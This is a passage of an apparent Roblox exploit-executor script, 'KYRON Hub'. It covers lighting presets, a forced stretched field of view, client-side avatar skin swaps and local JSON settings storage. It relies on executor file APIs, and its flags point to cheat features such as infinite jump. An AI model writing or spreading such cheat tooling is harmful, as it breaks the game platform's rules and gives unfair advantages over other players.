                    decay = { 140, 200, 180 },
                    glare = 1.5,
                    haze = 1.8,
                  },
                  clouds = { cover = 0.65, dens = 0.6, color = { 250, 253, 255 } },
                },
                ["Ocean"] = {
                  clock = 1.5,
                  brightness = 1.7,
                  ambient = { 60, 90, 120 },
                  outAmb = { 70, 100, 140 },
                  sky = { stars = 3000, moon = 24, sun = 0, moonTex = true },
                  atm = {
                    dens = 0.5,
                    color = { 24, 60, 140 },
                    decay = { 10, 30, 90 },
                    glare = 0.22,
                    haze = 1.5,
                  },
                },
                Vaporwave = {
                  clock = 19.5,
                  brightness = 2.4,
                  ambient = { 180, 120, 200 },
                  outAmb = { 190, 130, 230 },
                  sky = { stars = 1000, moon = 20 },
                  atm = {
                    dens = 0.45,
                    color = { 255, 100, 220 },
                    decay = { 120, 60, 255 },
                    glare = 0.52,
                    haze = 2.4,
                  },
                  clouds = {
                    cover = 0.5,
                    dens = 0.35,
                    color = { 210, 150, 255 },
                  },
                },
                Toxic = {
                  clock = 13,
                  brightness = 1.6,
                  ambient = { 140, 180, 80 },
                  outAmb = { 150, 190, 90 },
                  atm = {
                    dens = 0.35,
                    color = { 100, 220, 35 },
                    decay = { 65, 150, 20 },
                    glare = 1.8,
                    haze = 2.6,
                  },
                  clouds = { cover = 0.65, dens = 0.7, color = { 180, 255, 120 } },
                },
                ["Solar Eclipse"] = {
                  clock = 12,
                  brightness = 0.9,
                  ambient = { 50, 40, 65 },
                  outAmb = { 60, 50, 70 },
                  sky = { stars = 3500, sun = 22, moon = 0 },
                  atm = {
                    dens = 0.5,
                    color = { 255, 140, 40 },
                    decay = { 30, 20, 40 },
                    glare = 0.58,
                    haze = 2.5,
                  },
                },
                ["Hellscape"] = {
                  clock = 14,
                  brightness = 2.5,
                  ambient = { 200, 60, 25 },
                  outAmb = { 220, 70, 40 },
                  sky = { stars = 100, sun = 30, moon = 0 },
                  atm = {
                    dens = 0.85,
                    color = { 255, 30, 0 },
                    decay = { 120, 0, 0 },
                    glare = 3.5,
                    haze = 4,
                  },
                  clouds = { cover = 0.95, dens = 0.85, color = { 80, 20, 12 } },
                },
                Heaven = {
                  clock = 12,
                  brightness = 4,
                  ambient = { 240, 225, 210 },
                  outAmb = { 250, 200, 220 },
                  sky = { sun = 16, moon = 0, stars = 0 },
                  atm = {
                    dens = 0.25,
                    color = { 255, 250, 220 },
                    decay = { 255, 240, 200 },
                    glare = 3,
                    haze = 1.5,
                  },
                  clouds = { cover = 0.85, dens = 0.5, color = { 240, 255, 240 } },
                },
                Storm = {
                  clock = 15,
                  brightness = 1.8,
                  ambient = { 90, 90, 110 },
                  outAmb = { 100, 100, 120 },
                  sky = { stars = 0, sun = 5, moon = 0 },
                  atm = {
                    dens = 0.65,
                    color = { 80, 90, 120 },
                    decay = { 40, 50, 80 },
                    glare = 0.5,
                    haze = 3,
                  },
                  clouds = {
                    cover = 0.95,
                    dens = 0.85,
                    color = { 65, 85, 100 },
                  },
                },
                Sunrise = {
                  clock = 19,
                  brightness = 2.8,
                  ambient = { 220, 180, 130 },
                  outAmb = { 190, 140, 140 },
                  sky = { sun = 22, stars = 0, moon = 0 },
                  atm = {
                    dens = 0.5,
                    color = { 255, 180, 100 },
                    decay = { 255, 140, 100 },
                    glare = 0.45,
                    haze = 2.2,
                  },
                  clouds = { cover = 0.48, dens = 0.48, color = { 255, 220, 180 } },
                },
                ["Deep Space"] = {
                  clock = 0,
                  brightness = 1,
                  ambient = { 30, 25, 50 },
                  outAmb = { 40, 35, 60 },
                  sky = { stars = 15000, moon = 0, sun = 0 },
                  atm = {
                    dens = 0.15,
                    color = { 15, 5, 40 },
                    decay = { 5, 0, 20 },
                    glare = 0.2,
                    haze = 0.3,
                  },
                },
                ["Lavender Dream"] = {
                  clock = 18.5,
                  brightness = 2.6,
                  ambient = { 160, 160, 220 },
                  outAmb = { 190, 170, 230 },
                  sky = { stars = 800, moon = 16, sun = 0 },
                  atm = {
                    dens = 0.4,
                    color = { 210, 120, 255 },
                    decay = { 160, 120, 220 },
                    glare = 1.4,
                    haze = 1.8,
                  },
                  clouds = { cover = 0.55, dens = 0.5, color = { 175, 200, 255 } },
                },
                ["Inferno"] = {
                  clock = 17.5,
                  brightness = 2.2,
                  ambient = { 220, 100, 35 },
                  outAmb = { 235, 110, 60 },
                  sky = { sun = 26, moon = 0, stars = 0 },
                  atm = {
                    dens = 0.6,
                    color = { 240, 90, 24 },
                    decay = { 200, 40, 0 },
                    glare = 3,
                    haze = 3.2,
                  },
                  clouds = { cover = 0.7, dens = 0.65, color = { 200, 80, 40 } },
                },
                ["Galaxy"] = {
                  clock = 10,
                  brightness = 3.2,
                  ambient = { 160, 230, 230 },
                  outAmb = { 190, 180, 220 },
                  sky = { sun = 10 },
                  atm = {
                    dens = 0.3,
                    color = { 150, 255, 210 },
                    decay = { 100, 220, 180 },
                    glare = 1.6,
                    haze = 1.6,
                  },
                  clouds = { cover = 0.35, dens = 0.45, color = { 240, 255, 250 } },
                },
              }
            end

            KYRONSkyPresets = fn48()
          end

          v78._KYRONSkyPresets = KYRONSkyPresets
        end
      end

      _G._KYRONSkyMode = _G._KYRONSkyMode or "Lavender Dream"

      -- Sky presets and Lighting effects.
      _G._KYRONClearSky = _G._KYRONClearSky
        or function()
          local v78 = ipairs
          local Lighting_2 = game:GetService("Lighting")

          for _, child in v78(Lighting_2:GetChildren()) do
            if child:GetAttribute("KYRONSky") then
              pcall(function()
                child:Destroy()
              end)
            end
          end

          local terrain = workspace:FindFirstChildOfClass("Terrain")

          if terrain then
            for _, child in ipairs(terrain:GetChildren()) do
              if child:GetAttribute("_KYRONSky") then
                pcall(function()
                  child:Destroy()
                end)
              end
            end
          end
        end

      _G._KYRONStartSky = _G._KYRONStartSky
        or function(arg)
          _G._KYRONClearSky()
          local Lighting_2 = game:GetService("Lighting")
          local KYRONSkyMode = arg or _G._KYRONSkyMode or "Off"
          local v78 = _G._KYRONSkyPresets[KYRONSkyMode]

          local function fn48(arg2)
            return Color3.fromRGB(arg2[1], arg2[2], arg2[3])
          end

          if not v78 or v78.kind == "off" then
            pcall(function()
              Lighting_2.FogEnd = 100000
              Lighting_2.FogStart = 0
              Lighting_2.FogColor = Color3.fromRGB(192, 192, 200)
              Lighting_2.Brightness = 2
              Lighting_2.ClockTime = 14
              Lighting_2.GlobalShadows = true
              Lighting_2.Ambient = Color3.fromRGB(0, 0, 0)
              Lighting_2.OutdoorAmbient = Color3.fromRGB(127, 128, 127)
            end)

            _G._KYRONSkyMode = "Off"
            return
          end

          Lighting_2.FogEnd = 100000
          Lighting_2.FogStart = 0
          Lighting_2.FogColor = Color3.fromRGB(200, 210, 200)
          Lighting_2.ColorShift_Top = Color3.fromRGB(0, 0, 0)
          Lighting_2.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
          Lighting_2.GlobalShadows = true
          Lighting_2.ClockTime = v78.clock or 14
          Lighting_2.Brightness = v78.brightness or 2

          if v78.outAmb then
            Lighting_2.OutdoorAmbient = fn48(v78.outAmb)
          end

          if v78.ambient then
            Lighting_2.Ambient = fn48(v78.ambient)
          end

          if v78.sky then
            local sky = Instance.new("Sky")
            sky:SetAttribute("KYRONSky", true)

            if v78.sky.stars then
              sky.StarCount = v78.sky.stars
            end

            if v78.sky.moon then
              sky.MoonAngularSize = v78.sky.moon
            end

            if v78.sky.sun then
              sky.SunAngularSize = v78.sky.sun
            end

            if v78.sky.moonTex then
              sky.MoonTextureId = "rbxasset://sky/moon.jpg"
            end

            sky.Parent = Lighting_2
          end

          if v78.atm then
            local atmosphere = Instance.new("Atmosphere")
            atmosphere:SetAttribute("_KYRONSky", true)
            atmosphere.Density = v78.atm.dens or 0.25
            atmosphere.Color = fn48(v78.atm.color)
            atmosphere.Decay = fn48(v78.atm.decay)
            atmosphere.Glare = v78.atm.glare or 1
            atmosphere.Haze = v78.atm.haze or 1
            atmosphere.Parent = Lighting_2
          end

          local terrain = workspace:FindFirstChildOfClass("Terrain")

          if v78.clouds and terrain then
            local clouds = Instance.new("Clouds")
            clouds:SetAttribute("KYRONSky", true)
            clouds.Cover = v78.clouds.cover or 0.5
            clouds.Density = v78.clouds.dens or 0.5
            clouds.Color = fn48(v78.clouds.color)
            clouds.Parent = terrain
          end

          _G._KYRONSkyMode = KYRONSkyMode
        end

      _G._KYRONStopSky = _G._KYRONStopSky
        or function()
          _G._KYRONClearSky()

          pcall(function()
            local Lighting_2 = game:GetService("Lighting")
            Lighting_2.ClockTime = 20
            Lighting_2.Brightness = 2
            Lighting_2.Ambient = Color3.fromRGB(0, 0, 0)
            Lighting_2.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
          end)

          _G._KYRONSkyMode = "Off"
        end

      _G._KYRONLegacyStartSky = function(arg)
        _G._KYRONStartSky(arg)
      end

      _G._KYRONLegacyStopSky = function()
        _G._KYRONStopSky()
      end

      do
        local connection2 = nil
        local connection3 = nil

        fn38 = function()
          local currentCamera = workspace.CurrentCamera
          if not currentCamera then
            return
          end

          pcall(function()
            currentCamera.FieldOfViewMode = Enum.FieldOfViewMode.Vertical
          end)

          if connection2 then
            connection2:Disconnect()
          end

          if connection3 then
            connection3:Disconnect()
          end

          connection3 = RunService.RenderStepped:Connect(function()
            if not visualSettings.stretch then
              return
            end
            local currentCamera2 = workspace.CurrentCamera

            if currentCamera2 and currentCamera2.FieldOfView ~= visualSettings.fovVal then
              pcall(function()
                currentCamera2.FieldOfView = visualSettings.fovVal
              end)
            end
          end)

          connection2 = RunService.RenderStepped:Connect(function()
            if not visualSettings.stretch then
              return
            end
            local currentCamera2 = workspace.CurrentCamera

            if currentCamera2 then
              currentCamera2.CFrame = currentCamera2.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.65, 0, 0, 0, 1)
            end
          end)
        end

        fn39 = function()
          if connection2 then
            connection2:Disconnect()
            connection2 = nil
          end

          if connection3 then
            connection3:Disconnect()
            connection3 = nil
          end

          pcall(function()
            workspace.CurrentCamera.FieldOfView = 70
          end)
        end
      end
    end

    do
      do
        do
          local connection2 = nil

          fn40 = function()
            if connection2 then
              connection2:Disconnect()
            end

            connection2 = RunService.RenderStepped:Connect(function()
              if not visualSettings.fov then
                return
              end
              local currentCamera = workspace.CurrentCamera

              if currentCamera and currentCamera.FieldOfView ~= visualSettings.fovVal then
                pcall(function()
                  currentCamera.FieldOfView = visualSettings.fovVal
                end)
              end
            end)
          end

          fn41 = function()
            if connection2 then
              connection2:Disconnect()
              connection2 = nil
            end

            pcall(function()
              workspace.CurrentCamera.FieldOfView = 70
            end)
          end
        end

        infJump = true
        flag16 = true
        flag17 = false
        flag18 = true
        _G._KYRONLoadedOnLookAtEnemy = false
        _G._KYRONLoadedOnNeonWhiteTools = false
        _G._KYRONLoadedTryHard = false
        flag19 = true
        flag20 = false
        antiLag = true
        flag21 = false
        flag22 = true
        _G._KYRONLoadedOnPotato = false
        flag23 = false
        flag24 = false
        flag25 = false
        HttpService = game:GetService("HttpService")

        do
          local function fn48()
            local HttpService2 = game:GetService("HttpService")
            local str10 = "KYRONSkin_" .. tostring(localPlayer.UserId) .. ".json"

            local tbl37 = {
              KYRON = { 10928435480, 6913613757, 9683332649 },
              RED = {
                107377896731216,
                215718515,
                82831174733357,
                122851471549264,
                139051312584295,
                124572458012582,
                105029428205930,
              },
              BLUE = { 76059443, 74891470, 1180433861, 8781331764, 8682542843 },
              GALAXY = {
                82831174733357,
                139051312584295,
                107062966543626,
                71184246276344,
                111383282415116,
                78289009309744,
                71017311084699,
              },
            }

            local tbl38 = { KYRON = { 263995361762992 } }
            local tbl39 = {}
            local flag28 = true
            local str11 = "KYRON"
            local flag29 = false
            local tbl40 = nil

            local function fn49(arg)
              local v78 = arg or str11
              local tbl41 = {}
              local v79 = ipairs
              local tbl42 = tbl37[v78] or {}

              for _, v80 in v79(tbl42) do
                tbl41[#tbl41 + 1] = v80
              end

              local v80 = ipairs
              local tbl43 = tbl38[v78] or {}

              for _, v81 in v80(tbl43) do
                local tbl44 = tbl39[v81]

                if not tbl44 then
                  tbl44 = {}

                  local ok, result = pcall(function()
                    return game:GetService("AssetService"):GetBundleDetailsAsync(v81)
                  end)

                  if ok and result and type(result.Items) == "table" then
                    for _, item in ipairs(result.Items) do
                      if item.Type == "Asset" and tonumber(item.Id) then
                        tbl44[#tbl44 + 1] = tonumber(item.Id)
                      end
                    end
                  end

                  tbl39[v81] = tbl44
                end

                for _, v82 in ipairs(tbl44) do
                  tbl41[#tbl41 + 1] = v82
                end
              end

              return tbl41
            end

            local function fn50()
              if _G._KYRONUnifiedSaveActive and type(_G._KYRONRequestSave) == "function" then
                _G._KYRONRequestSave()
                return
              end

              if type(writefile) ~= "function" then
                return
              end
              pcall(writefile, str10, HttpService2:JSONEncode({ version = 2, enabled = flag28, preset = str11 }))
            end

            local function fn51()
              if type(readfile) ~= "function" or type(isfile) ~= "function" then
                return
              end

              local ok, result = pcall(function()
                if not isfile(str10) then
                  return nil
                end
                return HttpService2:JSONDecode(readfile(str10))
              end)

              if ok and type(result) == "table" and result.version == 2 then
                flag28 = result.enabled == true

                if tbl37[result.preset] then
                  str11 = result.preset
                end
              end
            end

            local function fn52(arg)
              tbl40 = {}

              for _, child in ipairs(arg:GetChildren()) do
                if child:IsA("Accessory") or child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") then
                  local ok, result = pcall(function()
                    return child:Clone()
                  end)

                  if ok and result then
                    tbl40[#tbl40 + 1] = result
                  end
                end
              end
            end

            local function fn53(arg)
              for _, child in ipairs(arg:GetChildren()) do
                if child:GetAttribute("KYRONSkin") or child:GetAttribute("KYRONVlonESkin") then
                  child:Destroy()
                end
              end
            end

            local function fn54(parent, arg, arg2)
              arg2:SetAttribute("KYRONSkin", true)

              pcall(function()
                arg:AddAccessory(arg2)
              end)

              if arg2.Parent ~= parent then
                arg2.Parent = parent
              end

              local handle = arg2:FindFirstChild("Handle")
              if not handle or not handle:IsA("BasePart") or handle:FindFirstChild("AccessoryWeld") then
                return true
              end
              local attachment = handle:FindFirstChildWhichIsA("Attachment")
              if not attachment then
                return true
              end
              local v78 = nil

              for _, descendant in ipairs(parent:GetDescendants()) do
                if descendant:IsA("Attachment") and descendant.Name == attachment.Name and not descendant:IsDescendantOf(arg2) then
                  v78 = descendant
                  break
                else
                  v78 = nil
                end
              end

              local parent2 = v78 and v78.Parent

              if parent2 and parent2:IsA("BasePart") then
                handle.Anchored = false
                handle.CanCollide = false
                handle.CanTouch = false
                handle.CanQuery = false
                handle.Massless = true
                handle.CFrame = parent2.CFrame * v78.CFrame * attachment.CFrame:Inverse()
                local weldConstraint = Instance.new("WeldConstraint")
                weldConstraint.Name = "KYRONAccessoryWeld"
                weldConstraint.Part0 = parent2
                weldConstraint.Part1 = handle
                weldConstraint.Parent = handle
              end

              return true
            end

            local function fn55(parent, arg, arg2)
              for _, child in ipairs(parent:GetChildren()) do
                if child:IsA("Accessory") then
                  local flag30 = false

                  pcall(function()
                    flag30 = tonumber(child.SourceAssetId) == tonumber(arg2)
                  end)

                  if flag30 then
                    return true
                  end
                end
              end

              local ok, result = pcall(function()
                return game:GetObjects("rbxassetid://" .. tostring(arg2))
              end)

              if not ok or type(result) ~= "table" or #result == 0 then
                local v78 = nil
                if not (pcall(function()
                  v78 = game:GetService("InsertService"):LoadAsset(arg2)
                end) and v78) then
                  return false
                end
                result = { v78 }
              end

              local flag30 = false

              for _, v78 in ipairs(result) do
                local tbl41 = {}

                if v78:IsA("Accessory") or v78:IsA("Shirt") or v78:IsA("Pants") or v78:IsA("ShirtGraphic") then
                  tbl41[#tbl41 + 1] = v78
                else
                  for _, descendant in ipairs(v78:GetDescendants()) do
                    if descendant:IsA("Accessory") or descendant:IsA("Shirt") or descendant:IsA("Pants") or descendant:IsA("ShirtGraphic") then
                      tbl41[#tbl41 + 1] = descendant
                    end
                  end
                end

                for _, v79 in ipairs(tbl41) do
                  local clone = v79:Clone()
                  clone:SetAttribute("KYRONSkin", true)

                  if clone:IsA("Accessory") then
                    fn54(parent, arg, clone)
                  else
                    for _, child in ipairs(parent:GetChildren()) do
                      if child.ClassName == clone.ClassName then
                        child:Destroy()
                      end
                    end

                    clone.Parent = parent
                  end

                  flag30 = true
                end

                pcall(function()
                  v78:Destroy()
                end)
              end

              return flag30
            end

            local function fn56(arg)
              local humanoidDescription = Instance.new("HumanoidDescription")
              local v78 = nil

              if not pcall(function()
                v78 = Players:CreateHumanoidModelFromDescriptionAsync(humanoidDescription, Enum.HumanoidRigType.R15)
              end) or not v78 then
                pcall(function()
                  v78 = Players:CreateHumanoidModelFromDescription(humanoidDescription, Enum.HumanoidRigType.R15)
                end)
              end

              humanoidDescription:Destroy()
              local humanoid = v78 and v78:FindFirstChildOfClass("Humanoid")

              if v78 and humanoid then
                for _, v79 in ipairs(fn49(arg)) do
                  pcall(fn55, v78, humanoid, v79)
                end
              end

              return v78
            end

            local function fn57(arg, transparency)
              arg = arg and arg:FindFirstChild("Head")
              if not arg then
                return
              end
              transparency = transparency and 1 or 0
              arg.Transparency = transparency
              arg.LocalTransparencyModifier = transparency

              for _, child in ipairs(arg:GetChildren()) do
                if child:IsA("Decal") or child:IsA("Texture") or child:IsA("BasePart") then
                  child.Transparency = transparency

                  if child:IsA("BasePart") then
                    child.LocalTransparencyModifier = transparency
                  end
                end
              end
            end

            local function fn58(arg)
              if not arg then
                return
              end
              local KYRONKorbloxRightLeg = arg:FindFirstChild("KYRONKorblox_RightLeg")

              if KYRONKorbloxRightLeg then
                KYRONKorbloxRightLeg:Destroy()
              end

              for _, v78 in ipairs({ "RightUpperLeg", "RightLowerLeg", "RightFoot" }) do
                local v79 = arg:FindFirstChild(v78)

                if v79 and v79:IsA("BasePart") then
                  v79.Transparency = 0
                  v79.LocalTransparencyModifier = 0
                end
              end
            end

            local function fn59(parent)
              if not parent then
                return false
              end
              fn58(parent)
              local rightUpperLeg = parent:FindFirstChild("RightUpperLeg")
              if not rightUpperLeg then
                return false
              end

              local ok, result = pcall(function()
                return game:GetObjects("rbxassetid://139607718")
              end)

              if not ok or not result or not result[1] then
                return false
              end
              local v78 = result[1]
              v78.Name = "KYRONKorblox_RightLeg"
              v78:SetAttribute("KYRONSkin", true)
              local isBasePart = v78:IsA("BasePart") and v78 or v78:FindFirstChildWhichIsA("BasePart", true)
              if not isBasePart then
                v78:Destroy()
                return false
              end

              for _, v79 in ipairs({ "RightUpperLeg", "RightLowerLeg", "RightFoot" }) do
                local v80 = parent:FindFirstChild(v79)

                if v80 and v80:IsA("BasePart") then
                  v80.Transparency = 1
                  v80.LocalTransparencyModifier = 1
                end
              end

              isBasePart.Anchored = false
              isBasePart.CanCollide = false
              isBasePart.CanTouch = false
              isBasePart.CanQuery = false
              isBasePart.Massless = true
              isBasePart.CFrame = rightUpperLeg.CFrame
              local weldConstraint = Instance.new("WeldConstraint")
              weldConstraint.Name = "KYRONKorbloxWeld"
              weldConstraint.Part0 = rightUpperLeg
              weldConstraint.Part1 = isBasePart
              weldConstraint.Parent = isBasePart
              v78.Parent = parent
              return true
            end

            local function fn60(arg)
              local v78 = fn56(arg)
              local humanoid = v78 and v78:FindFirstChildOfClass("Humanoid")
              if not v78 or not humanoid then
                return v78
              end
              fn57(v78, true)
              pcall(fn59, v78)
              return v78
            end

            local function fn61()
              if flag29 or not flag28 then
                return
              end
              local character = localPlayer.Character
              local humanoid = character and character:FindFirstChildOfClass("Humanoid")
              if not character or not humanoid then
                return
              end
              flag29 = true
              fn53(character)

              if not tbl40 then
                fn52(character)
              end

              for _, child in ipairs(character:GetChildren()) do
                if child:IsA("Accessory") or child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") then
                  child.Parent = nil
                end
              end

              local flag30 = false

              for _, v78 in ipairs(fn49()) do
                if not fn55(character, humanoid, v78) then
                  flag30 = true
                end
              end

              if flag30 then
                local v78 = fn56()

                if v78 then
                  for _, child in ipairs(v78:GetChildren()) do
                    if child:IsA("Accessory") then
                      if not character:FindFirstChild(child.Name) then
                        fn54(character, humanoid, child:Clone())
                      end
                    end
                  end

                  v78:Destroy()
                end
              end

              fn57(character, true)
              fn59(character)
              flag29 = false
            end

            local function fn62()
              local character = localPlayer.Character
              if not character then
                return
              end
              fn53(character)
              fn58(character)
              fn57(character, false)

              if tbl40 then
                for _, v78 in ipairs(tbl40) do
                  if v78 and v78.Parent == nil then
                    v78:Clone().Parent = character
                  end
                end
              end

              tbl40 = nil
            end

            fn51()

            -- Avatar skin presets: apply, preview, and restore.
            _G._KYRONSkin = {
              Presets = { "KYRON", "RED", "BLUE", "GALAXY" },
              IsEnabled = function()
                return flag28
              end,
              GetPreset = function()
                return str11
              end,
              SetState = function(arg, arg2, arg3)
                local v78 = string.upper(tostring(arg2 or str11))

                if tbl37[v78] then
                  str11 = v78
                end

                flag28 = arg == true

                if flag28 then
                  fn61()

                  task.delay(0.8, function()
                    if flag28 then
                      fn61()
                    end
                  end)
                else
                  fn62()
                end

                if not arg3 then
                  fn50()
                end
              end,
              SetEnabled = function(arg)
                flag28 = arg == true

                if flag28 then
                  fn61()

                  task.delay(0.8, function()
                    if flag28 then
                      fn61()
                    end
                  end)
                else
                  fn62()
                end

                fn50()
              end,
              SetPreset = function(arg)
                local v78 = string.upper(tostring(arg or ""))
                if not tbl37[v78] then
                  return
                end
                str11 = v78

                if flag28 then
                  fn61()
                end

                fn50()
              end,
              Apply = fn61,
              CreatePreviewRig = fn60,
            }

            localPlayer.CharacterAdded:Connect(function()
              tbl40 = nil

              if flag28 then
                task.delay(0.35, fn61)
                task.delay(1.15, fn61)
              end
            end)

            if flag28 and localPlayer.Character then
              task.defer(fn61)
            end
          end

          fn48()
        end
      end

      do
        -- Settings persistence: file paths, validation, load, and save.
        _G._KYRONSaveFiles = {
          config = "KYRONHubV5_All_" .. tostring(localPlayer.UserId) .. ".json",
          pending = "KYRONHubV5_All_" .. tostring(localPlayer.UserId) .. ".pending.json",
          backup = "KYRONHubV5_All_" .. tostring(localPlayer.UserId) .. ".backup.json",
          controller = "KYRONHubV5_Controller_" .. tostring(localPlayer.UserId) .. ".json",
          legacyConfig = "KYRONHubV4_Settings_" .. tostring(localPlayer.UserId) .. ".json",
          legacyConfigBackup = "KYRONHubV4_Settings_" .. tostring(localPlayer.UserId) .. ".backup.json",
          keybinds = "KYRONHubV4_Keybinds_" .. tostring(localPlayer.UserId) .. ".json",
          buttons = "KYRONHubV4_Buttons_" .. tostring(localPlayer.UserId) .. ".json",
          skin = "KYRONSkin_" .. tostring(localPlayer.UserId) .. ".json",
          legacy = "KYRONHubMobile_Config_" .. tostring(localPlayer.UserId) .. ".json",
          legacyShared = "KYRONHubMobile_" .. tostring(localPlayer.UserId) .. ".json",
        }

        _G._KYRONUnifiedSaveActive = true

        _G._KYRONSaveFiles.isfile = isfile
          or syn and syn.isfile
          or function(arg)
            local ok, result = pcall(function()
              local v78 = readfile
              local readfile_

              if v78 then
                readfile_ = v78
              else
                readfile_ = syn and syn.readfile
              end

              return readfile_(arg)
            end)

            return ok and result ~= nil
          end

        _G._KYRONSaveFiles.read = readfile or syn and syn.readfile
        _G._KYRONSaveFiles.write = writefile or syn and syn.writefile

        do
          local KYRONSaveFiles = _G._KYRONSaveFiles

          local canSave = type(_G._KYRONSaveFiles.read) == "function"

          if canSave then
            canSave = type(_G._KYRONSaveFiles.write) == "function"
          end

          KYRONSaveFiles.canSave = canSave
        end
      end

      _G._KYRONResolveSaveApi = function()
        local genv = getgenv and getgenv() or _G
        local tbl37 = {}
        local v78 = readfile
        local readfile_ = syn and syn.readfile
        local readfile_2 = genv.readfile
        tbl37[1] = v78
        tbl37[2] = readfile_
        tbl37[3] = readfile_2
        local tbl38 = {}
        local v79 = writefile
        local writefile_ = syn and syn.writefile
        local writefile_2 = genv.writefile
        tbl38[1] = v79
        tbl38[2] = writefile_
        tbl38[3] = writefile_2

        for _, v80 in pairs(tbl37) do
          if type(v80) == "function" then
            _G._KYRONSaveFiles.read = v80
            break
          end
        end

        for _, v80 in pairs(tbl38) do
          if type(v80) == "function" then
            _G._KYRONSaveFiles.write = v80
            break
          end
        end

        _G._KYRONSaveFiles.canSave = type(_G._KYRONSaveFiles.read) == "function" and type(_G._KYRONSaveFiles.write) == "function"
        return _G._KYRONSaveFiles.canSave
      end

      _G._KYRONSaveFiles.isfile = function(arg)
        if not _G._KYRONResolveSaveApi() then
          return false
        end
        local ok, result = pcall(_G._KYRONSaveFiles.read, arg)
        return ok and type(result) == "string"
      end

      _G._KYRONWriteJsonVerified = function(arg, arg2)
        if not _G._KYRONResolveSaveApi() then
          return false, "no file API"
        end

        local ok, result = pcall(function()
          return HttpService:JSONEncode(arg2)
        end)

        if not ok then
          return false, result
        end
        local ok2, result2 = pcall(_G._KYRONSaveFiles.write, arg, result)
        if not ok2 then
          return false, result2
        end
        local ok3, result3 = pcall(_G._KYRONSaveFiles.read, arg)
        if not ok3 or type(result3) ~= "string" or result3 ~= result then
          return false, "exact read-back failed"
        end

        local ok4, result4 = pcall(function()
          return HttpService:JSONDecode(result3)
        end)

        if not ok4 or type(result4) ~= "table" then
          return false, "verification parse failed"
        end
        return true
      end

      _G._KYRONIsGamepadBindName = function(arg)
        if type(arg) ~= "string" then
          return false
        end

        local ok, result = pcall(function()
          return Enum.KeyCode[arg]
        end)

        if not ok or not result then
          return false
        end
        local name = result.Name
        return name:sub(1, 6) == "Button" or name:sub(1, 4) == "DPad" or name:sub(1, 5) == "Thumb"
      end

      _G._KYRONPersistControllerBindings = function()
        if _G._KYRONSettingsReady ~= true then
          return false, "settings not ready"
        end
        local KYRONCtrlSave = {}
        local v78 = pairs
        local KYRONCtrlSave2 = _G._KYRONCtrlSave or {}

        for k, v79 in v78(KYRONCtrlSave2) do
          if type(k) == "string" then
            if v79 == "NONE" then
              KYRONCtrlSave[k] = "NONE"
            elseif _G._KYRONIsGamepadBindName(v79) then
              KYRONCtrlSave[k] = v79
            end
          end
        end

        _G._KYRONCtrlSave = KYRONCtrlSave
        local v79, v80 = _G._KYRONWriteJsonVerified(_G._KYRONSaveFiles.controller, {
          version = 2,
          userId = localPlayer.UserId,
          savedAt = os.time(),
          bindings = KYRONCtrlSave,
        })

        if not v79 then
          warn("[KYRONControllerSave]", v80)
        end

        return v79, v80
      end

      _G._KYRONLoadControllerBindings = function()
        if not _G._KYRONSaveFiles.isfile(_G._KYRONSaveFiles.controller) then
          return false
        end

        local ok, result = pcall(function()
          return HttpService:JSONDecode(_G._KYRONSaveFiles.read(_G._KYRONSaveFiles.controller))
        end)

        local flag28 = not ok or type(result) ~= "table"

        if not flag28 then
          local userId = localPlayer.UserId
          flag28 = tonumber(result.userId) ~= userId
        end

        if not flag28 then
          flag28 = type(result.bindings) ~= "table"
        end

        if flag28 then
          return false
        end
        _G._KYRONCtrlSave = _G._KYRONCtrlSave or {}
        local v78 = 2
        local flag29 = tonumber(result.version) >= v78

        for k, binding in pairs(result.bindings) do
          if type(k) == "string" and type(binding) == "string" then
            if flag29 and binding == "NONE" then
              _G._KYRONCtrlSave[k] = "NONE"
            elseif _G._KYRONIsGamepadBindName(binding) then
              _G._KYRONCtrlSave[k] = binding
            end
          end
        end

        return true
      end

      _G._KYRONHasSavedGamepadBind = function(arg)
        if type(arg) ~= "table" then
          return false
        end

        for _, v78 in pairs(arg) do
          if type(v78) == "string" and (v78:sub(1, 6) == "Button" or v78:sub(1, 4) == "DPad" or v78:sub(1, 5) == "Thumb") then
            local ok, result = pcall(function()
              return Enum.KeyCode[v78]
            end)

            if ok and result then
              return true
            end
          end
        end

        return false
      end

      _G._KYRONSaveButtonPlacements = function(arg)
        if type(_G._KYRONRequestSave) == "function" then
          return _G._KYRONRequestSave(arg == true)
        end
        return false
      end

      _G._KYRONResolveSaveApi()
      str9 = nil
      flag26 = false

      do
        local KYRONBootSaveSession = _G._KYRONBootSaveSession or {}
        _G._KYRONBootSaveSession = nil
        _G._KYRONSaveSession = KYRONBootSaveSession

        _G._KYRONSaveState = {
          lastAt = 0,
          queued = false,
          writing = false,
          dirty = false,
          revision = 0,
        }

        _G._KYRONConfigLoadReady = false
        _G._KYRONSettingsReady = false

        fn42 = function()
          return _G._KYRONSaveSession == KYRONBootSaveSession
        end
      end
    end

    do
      do
        saveKYRONSettings = function(arg)
          if not fn42() then
            return false
          end

          -- Forced saves (Save Settings / drag-end / close) may proceed once config load finished.
          -- Soft autosaves still wait until the full UI is ready.
          if _G._KYRONSettingsReady ~= true and arg ~= true then
            return false
          end

          if _G._KYRONConfigLoadReady ~= true then
            if not _G._KYRONResolveSaveApi() then
              return false
            end

            for _, v78 in ipairs({
              _G._KYRONSaveFiles.config,
              _G._KYRONSaveFiles.pending,
              _G._KYRONSaveFiles.backup,
              _G._KYRONSaveFiles.legacyConfig,
              _G._KYRONSaveFiles.legacyConfigBackup,
              _G._KYRONSaveFiles.keybinds,
              _G._KYRONSaveFiles.buttons,
              _G._KYRONSaveFiles.skin,
              _G._KYRONSaveFiles.legacy,
              _G._KYRONSaveFiles.legacyShared,
              "KYRONHubMobile.json",
            }) do
              if _G._KYRONSaveFiles.isfile(v78) then
                str9 = "config was not loaded; overwrite blocked"
                flag26 = false
                print("[KYRONSave] BLOCKED - re-execute so the existing config can load safely")
                return false
              end
            end

            _G._KYRONConfigLoadReady = true
          end

          -- Always snapshot live UI positions into the session tables before serializing.
          if type(_G._KYRONCaptureMobileButtonPositions) == "function" then
            pcall(_G._KYRONCaptureMobileButtonPositions)
          end
          do
            local currentCamera = workspace.CurrentCamera
            local viewport = currentCamera and currentCamera.ViewportSize
            if viewport and viewport.X > 0 and viewport.Y > 0 then
              local hub = playerGui:FindFirstChild("KYRONHubPolished")
